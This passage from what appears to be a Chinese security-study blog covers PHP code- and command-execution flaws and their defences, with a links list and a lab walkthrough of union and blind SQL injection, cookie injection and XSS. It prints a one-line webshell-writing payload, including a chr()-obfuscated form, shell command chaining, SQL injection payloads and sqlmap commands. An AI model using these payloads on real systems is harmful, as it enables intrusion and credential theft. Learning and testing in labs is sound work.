<p>但需要注意的是：eval参数必须是合法的PHP代码，必须以分号结尾，否则会报错。</p>
<blockquote>
<p><code>eval（&quot;phpinfo();&quot;);</code> &#x2F;&#x2F;应符合PHP的代码规范，须在phpinfo（）后面添加“<strong>；</strong>”</p>
<p><code>assert(&quot; phpinfo() &quot;);</code> &#x2F;&#x2F;assert没这要求</p>
</blockquote>
<h4 id="2-preg-replace（）函数"><a href="#2-preg-replace（）函数" class="headerlink" title="2.preg_replace（）函数"></a>2.preg_replace（）函数</h4><p>使用preg_replace（）函数的好处在于，此函数在业务系统中广泛使用，因此无法直接在PHP中进行禁用，在适用范围上比eval（）、assert（）函数好很多。但随着PHP版本的提升，preg-replace（）函数可使用的范围也非常小了。</p>
<p>其用法是执行一个正则表达式的搜索和替换</p>
<p>格式为：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line"></span><br><span class="line">//搜索subject中匹配pattern的部分，以replacement进行替换。</span><br></pre></td></tr></table></figure>
</blockquote>
<p>该函数的主要问题在于，当参数$pattern处存在一个“&#x2F;e”修饰符时，$replacement的值会被<strong>当成PHP代码</strong>来执行。此时代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&#x27;sds&#x27;],&quot;just a test!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输入值为phpinfo()，会被解析成代码执行。</p>
<p><strong>仅限于PHP5.4及以下版本中，5.5之后废弃了这个修饰符</strong>。要求用preg_replace_callback（）函数来代替。</p>
<h4 id="3-利用其他函数调用实现"><a href="#3-利用其他函数调用实现" class="headerlink" title="3.利用其他函数调用实现"></a>3.利用其他函数调用实现</h4><p>利用<strong>其他函数的组合</strong>来实现类似功能。PHP中有许多函数具有<strong>调用其他函数</strong>的功能，如array_map（）函数、call_user_func（）函数等，这里以array_map函数为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$some_array</span> = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$cmd</span>, <span class="variable">$some_array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618101221738.png"></p>
<p>同类型函数</p>
<blockquote>
<p>·ob_start（）、unserialize（）、create_function（）</p>
<p>·usort（）、uasort（）、uksort（）</p>
<p>·array_filter（）</p>
<p>·array_reduce（）</p>
<p>·array_diff_uassoc（）、array_diff_ukey（）</p>
<p>·array_udiff（）、array_udiff_assoc（）、array_udiff_uassoc（）</p>
<p>·array_intersect_assoc（）、array_intersect_uassoc（）</p>
<p>·array_uintersect（）、array_uintersect_assoc（）、array_uintersect_uassoc（）</p>
<p>·array_walk（）、array_walk_recursive（）</p>
<p>·xml_set_character_data_handler（）</p>
<p>·xml_set_default_handler（）</p>
<p>·xml_set_element_handler（）</p>
<p>·xml_set_end_namespace_decl_handler（）</p>
<p>·xml_set_external_entity_ref_handler（）</p>
<p>·xml_set_notation_decl_handler（）</p>
<p>·xml_set_processing_instruction_handler（）</p>
<p>·xml_set_start_namespace_decl_handler（）</p>
<p>·xml_set_unparsed_entity_decl_handler（）</p>
<p>·stream_filter_register（）</p>
<p>·set_error_handler（）</p>
<p>·register_shutdown_function（）</p>
<p>·register_tick_function（）</p>
</blockquote>
<h4 id="4-利用动态函数执行"><a href="#4-利用动态函数执行" class="headerlink" title="4.利用动态函数执行"></a>4.利用动态函数执行</h4><p>PHP语言的特性之一就是当前的PHP函数可直接由字符串拼接而成。因此，很多程序用了动态函数的写法，比如用可控的函数名来动态生成要执行的函数名称及内容。</p>
<p>在命令执行功能中，可利用这个特性实现命令的执行。环境测试代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo $a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当然，在实际中不会这么写，没意义</p>
<blockquote>
<p>url中输入?a&#x3D;assert&amp;b&#x3D;phpinfo()即可执行。</p>
</blockquote>
<p>注意：<strong>在php7.1版本之后 assert()默认不再可以执行代码</strong></p>
<h3 id="2-利用漏洞获取webshell"><a href="#2-利用漏洞获取webshell" class="headerlink" title="2.利用漏洞获取webshell"></a>2.利用漏洞获取webshell</h3><p>存在远程命令执行漏洞，攻击者最想获得的就是目的站点的webshell，<strong>即目标站点的控制权限。</strong></p>
<p>利用<strong>木马技术</strong>是获取webshell的有效手段。针对存在远程命令执行漏洞的环境，攻击者会尝试<strong>构建可执行的命令，并在命令执行后会导致目标站点在其本地生成一个PHP页面。</strong>生成的PHP页面中包含一句话木马。有效命令如下：</p>
<p><code>fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[&quot;cmd&quot;])?&gt;&#39;);</code></p>
<p>为了防止被进行编码和过滤嘞，利用chr对所有字符进行ASCII转换，进而执行。</p>
<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(CHR(102).CHR(112).CHR(117).CHR(116).CHR(115).CHR(40).CHR(102).CHR(111).CHR(112).CHR(101).CHR(110).CHR(40).CHR(34).CHR(97).CHR(46).CHR(112).CHR(104).CHR(112).CHR(34).CHR(44).CHR(34).CHR(119).CHR(34).CHR(41).CHR(44).CHR(39).CHR(60).CHR(63).CHR(112).CHR(104).CHR(112).CHR(32).CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(34).CHR(99).CHR(109).CHR(100).CHR(34).CHR(93).CHR(41).CHR(63).CHR(62).CHR(39).CHR(41).CHR(59))</span><br></pre></td></tr></table></figure>

<p>后台代码就这个，<strong>php5.3版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&#x27;cmd&#x27;],&quot;just a test!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618104339484.png"></p>
<p>是有的哈，蚁剑等一句话木马工具连接就可以了。</p>
<h4 id="单引号与双引号"><a href="#单引号与双引号" class="headerlink" title="单引号与双引号"></a>单引号与双引号</h4><p>关于payload的构造，务必要清楚单引号与双引号的区别。如果使用单引号，则引号内部的变量不会执行，会被系统直接输出；而双引号里的字段会经过编译器解释后进行执行，上述payload在执行fputs函数时首先要把第二个参数当做字符串处理，后面参数若用双引号包含，则程序会抛出异常，同时文件只会写入&lt;？php eval（）？&gt;，写入一句话失败。</p>
<p>url编码，单引号%27，双引号%22，记录一下。</p>
<p>函数被当作字符串进行输出而不会被执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;phpinfo()&quot;; //直接输出字符串了</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>需要利用大括号等进行特殊构造，以达到函数执行的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>7.3版本都是可以的。</strong></p>
<h2 id="系统命令执行漏洞"><a href="#系统命令执行漏洞" class="headerlink" title="系统命令执行漏洞"></a>系统命令执行漏洞</h2><p>利用系统自身的命令实现额外的命令执行。</p>
<p>比如有的靶场，让你输入ip，它会帮你去检测ip地址能否连通，这就用到了系统的ping功能。</p>
<p>PHP的系统命令执行函数也能实现，比如</p>
<blockquote>
<p>system（）、exec（）、shell_exec（）、passthru（）、pcntl_exec（）、popen（）、proc_open（）等，此外还有反引号命令执行，这种方式实际上是调用shell_exec（）函数来执行。</p>
</blockquote>
<p>这个pikachu、DVWA都有。</p>
<p>以pikachu为例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  &lt;div class=&quot;page-content&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;div id=&quot;comm_main&quot;&gt;</span><br><span class="line">                &lt;p class=&quot;comm_title&quot;&gt;Here, please enter the target IP address!&lt;/p&gt;</span><br><span class="line">                &lt;form method=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;input class=&quot;ipadd&quot; type=&quot;text&quot; name=&quot;ipaddress&quot; /&gt;</span><br><span class="line">                    &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ping&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">                    &lt;?php</span><br><span class="line">                    if($result)&#123;</span><br><span class="line">                        echo &quot;&lt;pre&gt;&#123;$result&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>输入ip，将ping命令与ip拼接，并执行。</p>
<p>输入ip没有过滤和限制，考虑如何同时执行两条系统命令。</p>
<p>在cmd中：</p>
<blockquote>
<p>C:\Users\67538&gt;whoami&amp;&amp;ipconfig<br>laptop-0kttc8k5\67538</p>
<p>Windows IP 配置</p>
<p>以太网适配器 以太网 2:</p>
<p>…</p>
</blockquote>
<p>当然了，**;和||**效果类似</p>
<h2 id="有效防护"><a href="#有效防护" class="headerlink" title="有效防护"></a>有效防护</h2><p>主要思路是消除漏洞存在环境，或针对传入的参数进行严格限制或过滤</p>
<h3 id="1-禁用部分系统函数"><a href="#1-禁用部分系统函数" class="headerlink" title="1.禁用部分系统函数"></a>1.禁用部分系统函数</h3><p>在PHP下禁用高危系统函数的方法为：打开PHP安装目录，找到php.ini，查找到disable_functions，添加需禁用的函数名，如下所示：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo()、eval()、passthru()、exec()、system()、chroot()、scandir()、chgrp()、chown()、shell_exec()、proc_open()、proc_get_status()、ini_alter()、ini_alter()、ini_restore()、dl()、pfsockopen()、openlog()、syslog()、readlink()、symlink()、popepassthru()、stream_socket_server()、fsocket()、fsockopen()</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="2-严格过滤关键字符"><a href="#2-严格过滤关键字符" class="headerlink" title="2　严格过滤关键字符"></a>2　严格过滤关键字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$substitutions = array( </span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, </span><br><span class="line">        &#x27;;&#x27; =&gt; &#x27;&#x27;, </span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ); </span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br></pre></td></tr></table></figure>

<p>过滤的关键字为“&amp;&amp;”“；”“”“||”，这些都可作为本地命令执行的关键字。远程的话，涉及的关键字符则比较复杂。在远程命令执行环境利用关键字符过滤并不十分合适。</p>
<h3 id="3-严格限制允许的参数类型"><a href="#3-严格限制允许的参数类型" class="headerlink" title="3　严格限制允许的参数类型"></a>3　严格限制允许的参数类型</h3><p>令执行功能主要用于扩展用户的交互行为，允许用户输入特定的参数来实现更丰富的应用功能。</p>
<p>例如，对于本地命令执行环境，业务系统希望用户输入IP地址来实现ping功能。因此，如果能对用户输入参数进行有效的合法性判断，可避免在原有命令后面拼接多余命令，也就达到了防护远程命令执行攻击的效果。</p>
<p>比如，正则。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>命令执行漏洞使用方法较为直接，也能更好地理解漏洞存在的原理。</p>
<p>需要注意的一点是，很多Web框架，如struts、thinkphp等均在框架内实现类似命令执行的功能，但由于实现方式与此完全不同，其修复建议也只能参考对应的官方修复包。</p>
]]></content>
  </entry>
  <entry>
    <title>在线网址</title>
    <url>/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
<p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
<p><a href="https://tool.oschina.net/regex">正则匹配在线</a></p>
<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><p>知识星球</p>
<p><a href="https://www.r2coding.com/">https://www.r2coding.com/</a></p>
<p><a href="https://www.vulhub.org.cn/search">漏洞检索 - VULHUB开源网络安全威胁库</a></p>
<p><a href="https://www.freebuf.com/column/195521.html">https://www.freebuf.com/column/195521.html</a></p>
<p><a href="http://xiaodi8.com/?id=25">http://xiaodi8.com/?id=25</a></p>
<p><a href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a></p>
<p><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
<p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
<p><a href="https://bbs.zkaq.cn/">Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></p>
<p><a href="https://overthewire.org/wargames/natas/natas9.html">OverTheWire: Natas Level 8 → Level 9</a></p>
<p><a href="https://www.52pojie.cn/forum.php">吾爱破解 - LCG - LSG|安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://blog.csdn.net/weixin_44211968/article/details/124696627?ops_request_misc=%7B%22request_id%22:%22168441788816800211527620%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168441788816800211527620&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124696627-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7&spm=1018.2226.3001.4187">【Web 安全】XSS 攻击详解_xss攻击_想变厉害的大白菜的博客-CSDN博客</a></p>
<p>pikachu靶场 <a href="http://t.csdn.cn/fhhlu">http://t.csdn.cn/fhhlu</a></p>
<p>乌云社区</p>
<p>先知社区</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3Nzg0ODk5OQ==&mid=2456708545&idx=1&sn=b6e003b72fa44a81ee0f916efb75471f&chksm=88d10d09bfa6841f1a457f72edda40400701ba0ce959e1ffac433d029212067e15cb726af3c1&scene=21#wechat_redirect">安全测试基础篇——OWASP API Security Top 10 (qq.com)</a></p>
<p><a href="https://blog.csdn.net/qq_45894840/article/details/123613510?ops_request_misc=&request_id=&biz_id=102&utm_term=hackthebox&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-123613510.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) hackthebox的网站使用教程_Ba1_Ma0的博客-CSDN博客</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3Nzg0ODk5OQ==&mid=2456708553&idx=1&sn=65baabdb0b3f2837552ab9d79e403f32&chksm=88d10d01bfa684175d8752b04b23549a4f29cd712747be5cc49bfa2e11295e4fac6dafcf16a9&cur_album_id=2064575600572334080&scene=189#wechat_redirect">安全测试基础篇——OWASP Web Application Top 10 (qq.com)</a></p>
<p>zoom eye.</p>
<h2 id="三、学习平台"><a href="#三、学习平台" class="headerlink" title="三、学习平台"></a>三、学习平台</h2><p>xss接收平台:<a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
<p>dnslog平台:<a href="http://ceye.io/">http://ceye.io/</a></p>
]]></content>
      <categories>
        <category>在线工具</category>
        <category>学习网址</category>
      </categories>
      <tags>
        <tag>编译</tag>
        <tag>加密解密</tag>
        <tag>其它工具</tag>
        <tag>学习网址</tag>
      </tags>
  </entry>
  <entry>
    <title>封神台靶场</title>
    <url>/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/</url>
    <content><![CDATA[<h2 id="一、女神小芳"><a href="#一、女神小芳" class="headerlink" title="一、女神小芳"></a>一、女神小芳</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515211214636.png" alt="image-20230515211214636"></p>
<h3 id="1-注入位置判断"><a href="#1-注入位置判断" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h3><p>id&#x3D;1,2,3时有不同页面，猜测id处可以注入</p>
<h3 id="2-注入类型判断（判断错误）"><a href="#2-注入类型判断（判断错误）" class="headerlink" title="2.注入类型判断（判断错误）"></a>2.注入类型判断（判断错误）</h3><p>&#x3D;&#x3D;<strong>显然没有回显位，故不用联合注入</strong>&#x3D;&#x3D;</p>
<p>1’、1”时页面不正常且不显示内容，故没有报错注入</p>
<p>&#x3D;&#x3D;首先进行数字型注入&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;<code>id=1 and 1=1 时页面正常</code>&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;<code>id=1 and 1=2 时页面不正常</code>&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;故数字型盲注。&#x3D;&#x3D;</p>
<p>看了wp才发现，原来还是可以用联合注入的，想当然了，以为回显位(order by)只出现在有输入框的地方。</p>
<h2 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="3.联合注入"></a>3.联合注入</h2><h3 id="1-order-by判断可显示列数"><a href="#1-order-by判断可显示列数" class="headerlink" title="1.order by判断可显示列数"></a>1.order by判断可显示列数</h3><p><code>id=1 order by 3内容为空 by 2为正常值</code></p>
<p>故回显位2</p>
<h3 id="2-union-select"><a href="#2-union-select" class="headerlink" title="2.union select"></a>2.union select</h3><p><code>?id=10000 union select 1,2#</code> id&#x3D;-1这种不行，被处理过了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235328914.png" alt="image-20230515235328914"></p>
<p>2改为database()，显示maoshe</p>
<h3 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h3><p>?id&#x3D;10000 union select 1,(select group_concat(’~‘,table_name) from information_schema.tables where table_schema&#x3D;database())#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235921469.png" alt="image-20230515235921469"></p>
<h3 id="4-爆列名"><a href="#4-爆列名" class="headerlink" title="4.爆列名"></a>4.爆列名</h3><p>?id&#x3D;10000%20union%20select%201,(select%20group_concat(%27~%27,column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;database()%20and%20table_name&#x3D;%27admin%27)#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001033181.png" alt="image-20230516001033181"></p>
<h3 id="5-爆列名值"><a href="#5-爆列名值" class="headerlink" title="5.爆列名值"></a>5.爆列名值</h3><p>?id&#x3D;10000%20union%20select%201,(select group_concat(‘~’,password) from admin)#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001159511.png" alt="image-20230516001159511"></p>
<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h3><p>不能简单认为无输入框就没有联合注入，还是要多想，多尝试。</p>
<h2 id="盲注过程，算是复习吧qaq"><a href="#盲注过程，算是复习吧qaq" class="headerlink" title="盲注过程，算是复习吧qaq"></a>盲注过程，算是复习吧qaq</h2><h3 id="3-数据库长度判断"><a href="#3-数据库长度判断" class="headerlink" title="3.数据库长度判断"></a>3.数据库长度判断</h3><p><code>id=1%20and%20length(database())&gt;5 时正常，&gt;6时不正常</code></p>
<p>故database()长度为6</p>
<h3 id="4-数据库爆破"><a href="#4-数据库爆破" class="headerlink" title="4.数据库爆破"></a>4.数据库爆破</h3><p><code>id=1 and ascii(substr(database(),&#123;1&#125;,1)) &gt; &#123;1&#125; #判断第一个字母</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215548482.png" alt="image-20230515215548482"></p>
<p>数据库名maoshe</p>
<h3 id="5-表名长度判断"><a href="#5-表名长度判断" class="headerlink" title="5.表名长度判断"></a>5.表名长度判断</h3><p><code>id=1 and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;4正常，&gt;5时不正常</code></p>
<p>故第一个表名长度5 </p>
<h3 id="6-表名爆破"><a href="#6-表名爆破" class="headerlink" title="6.表名爆破"></a>6.表名爆破</h3><p><code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;maoshe&#39; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code>#判断表名第一个字符</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215706751.png" alt="image-20230515215706751"></p>
<p>第一个表名admin</p>
<p>第二个表名dirs</p>
<p>第三个表名news</p>
<p>第四个表名xss</p>
<h3 id="7-列名长度判断"><a href="#7-列名长度判断" class="headerlink" title="7.列名长度判断"></a>7.列名长度判断</h3><p>id &#x3D;1 and (select length(column_name) from information_schema. columns where table_name &#x3D; ‘admin’ and table_schema &#x3D; ‘maoshe’  limit  0,1)&gt;1 &#x2F;&#x2F;列名</p>
<h3 id="8-列名判断"><a href="#8-列名判断" class="headerlink" title="8.列名判断"></a>8.列名判断</h3><p><code>id =1 and ascii(substr((select column_name from information_schema.columns where table_name = &#39;admin&#39; and table_schema = &#39;maoshe&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125; //列名</code></p>
<p>admin表的列名Id、username、passwGrd</p>
<p>dirs表的列名paths</p>
<p>news表的列名id、content</p>
<p>xss表的列名id、user、pass</p>
<h3 id="9-爆值"><a href="#9-爆值" class="headerlink" title="9.爆值"></a>9.爆值</h3><p>看下xss的pass字段吧</p>
<p><code>id=1 and ascii(substr((select &#39;pass&#39; from &#39;xss&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code></p>
<p>嘶，没跑出来flag的字样的，哪里漏掉了</p>
<h3 id="10-sqlmap"><a href="#10-sqlmap" class="headerlink" title="10.sqlmap"></a>10.sqlmap</h3><p>用sqlmap解决吧。</p>
<blockquote>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“ –dbs</p>
<p>跑出了maoshe、test、information_schema</p>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe –tables</p>
<p>表名没问题</p>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe -T admin –columns –dump</p>
<p>emm，admin表中的列是password，脚本还跑错了。</p>
</blockquote>
<h1 id="二、WAF过滤"><a href="#二、WAF过滤" class="headerlink" title="二、WAF过滤"></a>二、WAF过滤</h1><h2 id="1-注入位置判断-1"><a href="#1-注入位置判断-1" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h2><p><img src="/../../../Typora/img111/image-20230516095034637.png" alt="image-20230516095034637"></p>
<p>找到新闻中任意一个具体页面，出现id&#x3D;171，猜测有注入点</p>
<h2 id="2-尝试闭合"><a href="#2-尝试闭合" class="headerlink" title="2.尝试闭合"></a>2.尝试闭合</h2><p>and、单引号等，and的双写也被过滤了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516095129031.png" alt="image-20230516095129031"></p>
<p>提示过滤了and update delete ; insert mid master</p>
<p>双引号和括号发现提示数据库出错</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516095308937.png" alt="image-20230516095308937"></p>
<p>而且这个order by的话就到10了。</p>
<p>各种传统关键字绕过尝试后，没其他办法了</p>
<p>看了wp，才知道用cookie，这里我用的工具是burp。</p>
<h2 id="3-先抓包"><a href="#3-先抓包" class="headerlink" title="3.先抓包"></a>3.先抓包</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516113815024.png" alt="image-20230516113815024"></p>
<p>右键发送repeate，删除掉?id&#x3D;171，避免接受url参数，转而添加Cookie参数，先 添加id&#x3D;171试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516114902620.png" alt="image-20230516114902620"></p>
<p>页面显示正常，可以尝试联合注入</p>
<h2 id="4-联合注入"><a href="#4-联合注入" class="headerlink" title="4.联合注入"></a>4.联合注入</h2><h3 id="1-union-select"><a href="#1-union-select" class="headerlink" title="1.union select"></a>1.union select</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516115631577.png" alt="image-20230516115631577"></p>
<p><code>id=1710000%20union%20select%201,2,3,4,5,6,7,8,9,10%20from%20admin;</code></p>
<p>注意空格记得填充，无论是%20还是+都可以</p>
<p>之所以加from admin，目的是猜测admin是否存在。</p>
<p>显示结果如下：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516115712683.png" alt="image-20230516115712683"></p>
<p>证明表admin是存在的</p>
<h3 id="2-猜解字段名"><a href="#2-猜解字段名" class="headerlink" title="2.猜解字段名"></a>2.猜解字段名</h3><p>这里参考的官方wp是说，直接猜解常见字段名</p>
<p><code>id=1710000%20union%20select%201,username,3,4,5,6,7,8,password,10%20from%20admin;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516120410289.png" alt="image-20230516120410289"></p>
<p>数字加字母的16位组合，看出密码像是md5特征，解密试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121144887.png" alt="image-20230516121144887"></p>
<p>得到明文内容为welcome的密码</p>
<p>已知账号与密码，尝试后台登录。</p>
<h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3.登录"></a>3.登录</h3><p>这是根据经验猜解的后台路径吧。。。。根目录下&#x2F;admin</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121550218.png" alt="image-20230516121550218"></p>
<p>输入admin,welcome</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121649512.png" alt="image-20230516121649512"></p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>当url上各种绕过尝试失效时，应该要联想到其它注入方式，如Cookie注入等。</p>
<h1 id="三、XSS"><a href="#三、XSS" class="headerlink" title="三、XSS"></a>三、XSS</h1><p>这关进入到了留言板页面，全部输入框都写进xss代码，确实存在。目的是获取cookie。</p>
<p>给每个框框试了一下</p>
<script>alert(1)</script>

<p>存在xss漏洞。</p>
<p>xss平台搭建参照：<a href="https://www.cnblogs.com/Cl0ud/p/12176961.html">搭建xss-platform平台 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520205909377-1684589650280-1.png"></p>
<p>再生成payload进行注入即可。</p>
<p>但是我的平台没收到。（噗，我搭建的是）</p>
<p>尝试用dvwa的xss漏洞时，都可以收到，但是封神台上失败。</p>
]]></content>
      <categories>
        <category>靶场演练</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>渗透测试</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传综述</title>
